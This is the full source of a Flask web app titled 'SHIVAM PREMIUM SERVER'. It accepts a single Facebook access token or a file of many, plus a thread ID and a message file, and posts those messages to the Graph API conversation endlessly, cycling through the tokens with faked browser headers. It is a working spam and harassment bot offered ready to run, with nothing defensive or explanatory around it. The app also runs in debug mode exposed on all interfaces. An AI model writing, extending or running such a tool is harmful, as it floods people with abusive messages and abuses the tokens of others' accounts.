from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}
message_counters = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    message_counters[task_id] = 0
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                try:
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        message_counters[task_id] += 1
                        print(f"✅ Sent ({message_counters[task_id]}): {message}")
                    else:
                        print(f"❌ Failed: {message}")
                except Exception as e:
                    print("Error:", e)
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        token_option = request.form.get('tokenOption')
        if token_option == 'single':
            access_tokens = [request.form.get('singleToken')]
        else:
            token_file = request.files['tokenFile']
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return render_template_string(PAGE_HTML, task_id=task_id)

    return render_template_string(PAGE_HTML, task_id=None)

@app.route('/status/<task_id>')
def get_status(task_id):
    count = message_counters.get(task_id, 0)
    running = task_id in threads and not stop_events[task_id].is_set()
    return jsonify({'count': count, 'running': running})

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

PAGE_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>⚡ SHIVAM PREMIUM SERVER ⚡</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background: linear-gradient(135deg, #0a0a0a 0%, #1c1c1c 100%);
      color: white;
      font-family: 'Poppins', sans-serif;
      height: 100vh;
      background-attachment: fixed;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .glass-box {
      margin-top: 60px;
      background: rgba(255,255,255,0.08);
      border: 1px solid rgba(255,255,255,0.15);
      border-radius: 20px;
      padding: 25px;
      width: 95%;
      max-width: 400px;
      box-shadow: 0 0 25px rgba(0,255,255,0.3);
      backdrop-filter: blur(10px);
      animation: glow 2s infinite alternate;
    }
    @keyframes glow {
      from { box-shadow: 0 0 10px #00ffee; }
      to { box-shadow: 0 0 25px #00ffee, 0 0 50px #00ffee; }
    }
    .form-control, select, input[type=file] {
      background: rgba(255,255,255,0.1);
      border: 1px solid rgba(255,255,255,0.2);
      color: white;
    }
    .form-control:focus {
      box-shadow: 0 0 10px cyan;
      border-color: cyan;
    }
    .btn-primary {
      background: linear-gradient(45deg, #00ffe0, #0077ff);
      border: none;
      transition: all 0.3s ease;
    }
    .btn-primary:hover {
      transform: scale(1.05);
      box-shadow: 0 0 20px #00ffe0;
    }
    .status-box {
      margin-top: 20px;
      background: rgba(0,0,0,0.3);
      border-radius: 10px;
      padding: 15px;
      color: cyan;
      font-weight: bold;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="glass-box">
    <h2 class="text-center mb-3">⚡ SHIVAM LIVE SERVER ⚡</h2>
    <form method="post" enctype="multipart/form-data">
      <label>Select Token Option</label>
      <select class="form-control mb-3" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
        <option value="single">Single Token</option>
        <option value="multiple">Token File</option>
      </select>

      <div id="singleTokenInput">
        <label>Enter Single Token</label>
        <input type="text" class="form-control mb-3" name="singleToken">
      </div>

      <div id="tokenFileInput" style="display: none;">
        <label>Choose Token File</label>
        <input type="file" class="form-control mb-3" name="tokenFile">
      </div>

      <label>Enter Thread ID</label>
      <input type="text" class="form-control mb-3" name="threadId" required>

      <label>Enter Your Name</label>
      <input type="text" class="form-control mb-3" name="kidx" required>

      <label>Time Interval (seconds)</label>
      <input type="number" class="form-control mb-3" name="time" required>

      <label>Choose Message File</label>
      <input type="file" class="form-control mb-3" name="txtFile" required>

      <button type="submit" class="btn btn-primary w-100">🚀 Start</button>
    </form>

    {% if task_id %}
    <div class="status-box" id="statusBox">
      Task Running ID: <span style="color:white;">{{ task_id }}</span><br>
      Messages Sent: <span id="msgCount">0</span>
    </div>
    <script>
      const taskId = "{{ task_id }}";
      setInterval(() => {
        fetch(`/status/${taskId}`)
          .then(res => res.json())
          .then(data => {
            if (data.running) {
              document.getElementById('msgCount').innerText = data.count;
            } else {
              document.getElementById('statusBox').innerHTML = "✅ Task Completed!";
            }
          });
      }, 2000);
    </script>
    {% endif %}
  </div>
  <script>
    function toggleTokenInput() {
      const opt = document.getElementById('tokenOption').value;
      document.getElementById('singleTokenInput').style.display = opt === 'single' ? 'block' : 'none';
      document.getElementById('tokenFileInput').style.display = opt === 'multiple' ? 'block' : 'none';
    }
  </script>
</body>
</html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5040)
     
